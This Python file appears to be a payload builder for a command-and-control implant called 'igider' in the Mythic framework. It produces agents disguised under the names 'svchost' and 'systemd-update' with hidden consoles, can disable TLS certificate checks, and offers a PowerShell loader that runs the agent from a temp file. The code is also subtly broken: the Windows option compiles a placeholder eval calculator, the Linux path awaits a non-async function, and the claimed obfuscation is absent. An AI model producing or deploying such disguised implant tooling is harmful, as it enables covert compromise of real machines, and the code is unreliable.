from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import pathlib
import os
import tempfile
import base64
import hashlib
import json
import random
import string
import logging
from typing import Dict, Any, List, Optional
from itertools import cycle
import datetime
import textwrap
import tempfile
import subprocess
import sys
import shutil

class Igider(PayloadType):
    name = "igider"
    file_extension = "py"
    author = "@med"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False
    wrapped_payloads = ["pickle_wrapper"]
    mythic_encrypts = True
    note = "Production-ready Python agent with advanced obfuscation and encryption features"
    supports_dynamic_loading = True
    
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="How the final payload should be structured for execution",
            choices=["py","exe_windows", "elf_linux", "powershell_reflective"],
            default_value="py"
        ),
        BuildParameter(
            name="https_check",
            parameter_type=BuildParameterType.ChooseOne,
            description="Verify HTTPS certificate (if HTTP, leave yes)",
            choices=["Yes", "No"],
            default_value="Yes"
        )
    ]
    
    c2_profiles = ["http", "https"]
    
    # Use relative paths that can be configured
    _BASE_DIR = pathlib.Path(".")
    
    @property
    def agent_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "mythic"
    
    @property
    def agent_icon_path(self) -> pathlib.Path:
        return self.agent_path / "icon.svg"
    
    @property
    def agent_code_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "agent_code"
    
    build_steps = [
        BuildStep(step_name="Initializing Build", step_description="Setting up the build environment"),
        BuildStep(step_name="Gathering Components", step_description="Collecting agent code modules"),
        BuildStep(step_name="Configuring Agent", step_description="Applying configuration parameters"),
        BuildStep(step_name="Finalizing Payload", step_description="Preparing final output format")
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.logger = self._setup_logger()
        
    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger("igider_builder")
        logger.setLevel(logging.DEBUG)
        return logger

    def get_file_path(self, directory: pathlib.Path, file: str) -> str:
        """Get the full path to a file, verifying its existence."""
        filename = os.path.join(directory, f"{file}.py")
        return filename if os.path.exists(filename) else ""
    
    async def update_build_step(self, step_name: str, message: str, success: bool = True) -> None:
        """Helper to update build step status in Mythic UI."""
        try:
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName=step_name,
                StepStdout=message,
                StepSuccess=success
            ))
        except Exception as e:
            self.logger.error(f"Failed to update build step: {e}")

    def _load_module_content(self, module_path: str) -> str:
        """Safely load content from a module file."""
        try:
            with open(module_path, "r") as f:
                return f.read()
        except Exception as e:
            self.logger.error(f"Error loading module {module_path}: {e}")
            return ""

    def _apply_config_replacements(self, code: str, replacements: Dict[str, Any]) -> str:
        """Apply configuration replacements to code."""
        for key, value in replacements.items():
            if isinstance(value, (dict, list)):
                # Convert Python objects to JSON, then fix boolean/null values for Python syntax
                json_val = json.dumps(value).replace("false", "False").replace("true", "True").replace("null", "None")
                code = code.replace(key, json_val)
            elif value is not None:
                code = code.replace(key, str(value))
        return code
    
    def _create_pyinstaller_spec(self,code: str, target_os: str) -> str:
        """Generate PyInstaller spec file for executable creation."""
        # Determine values based on target_os
        exe_name = "svchost" if target_os == "windows" else "systemd-update"
        console_mode = "False" if target_os == "windows" else "True"
        # Remove icon requirement to avoid file not found error
        icon_line = ''
        
        spec_content = textwrap.dedent(f"""
            # -*- mode: python ; coding: utf-8 -*-

            block_cipher = None

            a = Analysis(
                ['main.py'],
                pathex=[],
                binaries=[],
                datas=[],
                hiddenimports=['urllib.request', 'urllib.parse', 'ssl', 'json', 'base64', 'threading', 'time'],
                hookspath=[],
                hooksconfig={{}},
                runtime_hooks=[],
                excludes=[],
                win_no_prefer_redirects=False,
                win_private_assemblies=False,
                cipher=block_cipher,
                noarchive=False,
            )

            pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

            exe = EXE(
                pyz,
                a.scripts,
                a.binaries,
                a.zipfiles,
                a.datas,
                [],
                name='{exe_name}',
                debug=False,
                bootloader_ignore_signals=False,
                strip=False,
                upx=True,
                upx_exclude=[],
                runtime_tmpdir=None,
                console={console_mode},
                disable_windowed_traceback=False,
                argv_emulation=False,
                target_arch=None,
                codesign_identity=None,
                entitlements_file=None,
                {icon_line}
            )
        """)
        return spec_content




    def _create_powershell_loader(self, python_code: str) -> str:
        """Create PowerShell reflective loader for Python agent."""
        # Clean each line of the embedded Python code
        cleaned_python_code = '\n'.join(line.rstrip() for line in python_code.split('\n'))

        # Build the PowerShell string with exact formatting — no indent issues
        powershell_loader = (
            '# PowerShell Reflective Python Loader\n'
            '$pythonCode = @"\n'
            f'{cleaned_python_code}\n'
            '"@\n'
            '\n'
            '# Check for Python installation\n'
            '$pythonPaths = @(\n'
            '    "$env:LOCALAPPDATA\\Programs\\Python\\*\\python.exe",\n'
            '    "$env:PROGRAMFILES\\Python*\\python.exe",\n'
            '    "$env:PROGRAMFILES(X86)\\Python*\\python.exe",\n'
            '    "python.exe"\n'
            ')\n'
            '\n'
            '$pythonExe = $null\n'
            'foreach ($path in $pythonPaths) {\n'
            '    try {\n'
            '        $resolved = Get-Command $path -ErrorAction SilentlyContinue\n'
            '        if ($resolved) {\n'
            '            $pythonExe = $resolved.Source\n'
            '            break\n'
            '        }\n'
            '    } catch {}\n'
            '}\n'
            '\n'
            'if (-not $pythonExe) {\n'
            '    Write-Host "Python not found, attempting alternative execution..."\n'
            '    Add-Type -AssemblyName System.Net.Http\n'
            '    exit 1\n'
            '}\n'
            '\n'
            '$tempFile = [System.IO.Path]::GetTempFileName() + ".py"\n'
            '$pythonCode | Out-File -FilePath $tempFile -Encoding UTF8\n'
            '\n'
            'try {\n'
            '    & $pythonExe $tempFile\n'
            '} finally {\n'
            '    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue\n'
            '}\n'
        )

        return powershell_loader


    

    def _build_executable(self,code: str, target_os: str) -> bytes:
    
        # Check if PyInstaller is available
        try:
            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            raise Exception("PyInstaller is not installed or not available in PATH")
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create main Python file
            main_py = os.path.join(temp_dir, "main.py")
            with open(main_py, "w") as f:
                f.write(code)
            
            # Create a basic icon file if needed (optional)
            # For now, we'll skip the icon to avoid complexity
            
            # Create spec file
            spec_content = self._create_pyinstaller_spec(code, target_os)
            spec_file = os.path.join(temp_dir, "build.spec")
            with open(spec_file, "w") as f:
                f.write(spec_content)
            
            try:
                # Run PyInstaller with proper arguments
                cmd = [sys.executable, "-m", "PyInstaller", spec_file]

                
                self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
                result = subprocess.run(
                    cmd, 
                    capture_output=True, 
                    text=True, 
                    cwd=temp_dir,
                    timeout=300  # 5 minute timeout
                )
                
                if result.returncode != 0:
                    self.logger.error(f"PyInstaller stdout: {result.stdout}")
                    self.logger.error(f"PyInstaller stderr: {result.stderr}")
                    raise Exception(f"PyInstaller failed with return code {result.returncode}: {result.stderr}")
                
                # Find the generated executable in the correct location
                exe_name = "svchost.exe" if target_os == "windows" else "systemd-update"
                
                # PyInstaller puts executables in dist/ directory
                dist_dir = os.path.join(temp_dir, "dist")
                exe_path = os.path.join(dist_dir, exe_name)
                
                if not os.path.exists(exe_path):
                    # Fallback: look for any executable in dist directory
                    if os.path.exists(dist_dir):
                        files = [f for f in os.listdir(dist_dir) if os.path.isfile(os.path.join(dist_dir, f))]
                        if files:
                            exe_path = os.path.join(dist_dir, files[0])
                            self.logger.info(f"Using fallback executable: {exe_path}")
                        else:
                            raise Exception(f"No executable found in {dist_dir}")
                    else:
                        raise Exception(f"Distribution directory not created: {dist_dir}")
                
                if not os.path.exists(exe_path):
                    raise Exception(f"Executable not found at expected path: {exe_path}")
                
                # Read and return the executable
                with open(exe_path, "rb") as f:
                    executable_data = f.read()
                    
                self.logger.info(f"Successfully built executable of size: {len(executable_data)} bytes")
                return executable_data
                    
            except subprocess.TimeoutExpired:
                raise Exception("PyInstaller build timed out after 5 minutes")
            except Exception as e:
                self.logger.error(f"Executable build failed: {e}")
                raise Exception(f"Failed to build executable: {str(e)}")
            

    async def build(self) -> BuildResponse:
        """Build the Igider payload with the specified configuration."""
        resp = BuildResponse(status=BuildStatus.Success)
        build_errors = []
        
        try:
            # Step 1: Initialize build
            await self.update_build_step("Initializing Build", "Starting build process...")
            # Step 2: Gather components
            await self.update_build_step("Gathering Components", "Loading agent modules...")
                # Load base agent code
            base_agent_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "base_agent")
            if not base_agent_path:
                build_errors.append("Base agent code not found")
                await self.update_build_step("Gathering Components", "Base agent code not found", False)
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "\n".join(build_errors)
                return resp
                
            base_code = self._load_module_content(base_agent_path)
            
                # Load command modules
            command_code = ""
            for cmd in self.commands.get_commands():
                command_path = self.get_file_path(self.agent_code_path, cmd)
                if not command_path:
                    build_errors.append(f"Command module '{cmd}' not found")
                else:
                    command_code += self._load_module_content(command_path) + "\n"
            
            # Step 3: Configure agent
            await self.update_build_step("Configuring Agent", "Applying agent configuration...")
            
                # Replace placeholders with actual code/config
            base_code = base_code.replace("UUID_HERE", self.uuid)
            base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
            
            
                # Process C2 profile configuration
            for c2 in self.c2info:
                profile = c2.get_c2profile()["name"]
                base_code = self._apply_config_replacements(base_code, c2.get_parameters_dict())
            
            # Configure HTTPS certificate validation
            if self.get_parameter("https_check") == "No":
                base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                base_code = base_code.replace("#CERTSKIP", 
                """
        gcontext = ssl.create_default_context()
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE\n""")
            else:
                base_code = base_code.replace("#CERTSKIP", "")
            
            
            
            # Step 5: Finalize payload format
            await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
            
            output_format = self.get_parameter("output")
            calculator_code = textwrap.dedent("""\
            def main():
                print("Calculator Ready")
                while True:
                    try:
                        x = input(">>> ")
                        if x.lower() in ('exit', 'quit'):
                            break
                        print(eval(x))
                    except Exception as e:
                        print("Error:", e)

            if __name__ == "__main__":
                main()
            """)
            if output_format == "exe_windows":
                try:
                    await self.update_build_step("Finalizing Payload", "Building Windows executable...")
                    executable_data = self._build_executable(calculator_code,"windows")
                    resp.payload = executable_data
                    resp.updated_filename = (self.filename).split(".")[0] +".exe"
                    resp.build_message = "Successfully built Windows executable"
                except Exception as e:
                    resp.set_status(BuildStatus.Error)
                    resp.build_stderr = f"Failed to build Windows executable: {str(e)}"
                    return resp
            elif output_format == "elf_linux":
                try:
                    await self.update_build_step("Finalizing Payload", "Building Linux executable...")
                    executable_data = await self._build_executable(base_code, "linux")
                    resp.payload = executable_data
                    resp.updated_filename = (self.filename).split(".")[0] +".elf"
                    resp.build_message = "Successfully built Linux executable"
                except Exception as e:
                    resp.set_status(BuildStatus.Error)
                    resp.build_stderr = f"Failed to build Linux executable: {str(e)} * {self.filename} * {output_format}"
                    return resp
            elif output_format == "powershell_reflective":
                try:
                    await self.update_build_step("Finalizing Payload", "Creating PowerShell reflective loader...")
                    ps_loader = self._create_powershell_loader(base_code)
                    resp.payload = ps_loader.encode()
                    resp.updated_filename = (self.filename).split(".")[0] +".ps1"
                    resp.build_message = "Successfully built PowerShell reflective loader"
                except Exception as e:
                    resp.set_status(BuildStatus.Error)
                    resp.build_stderr = f"Failed to build PowerShell loader: {str(e)}"
                    return resp
            else:  # default to py
                resp.payload = base_code.encode()
                resp.build_message = "Successfully built Python script payload"
            
            # Report any non-fatal errors
            if build_errors:
                resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
            

        except Exception as e:
            self.logger.error(f"Build failed: {str(e)}")
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = f"Error building payload: {str(e)}"
            await self.update_build_step("Finalizing Payload", f"Build failed: {str(e)}", False)
            
        return resp
    
    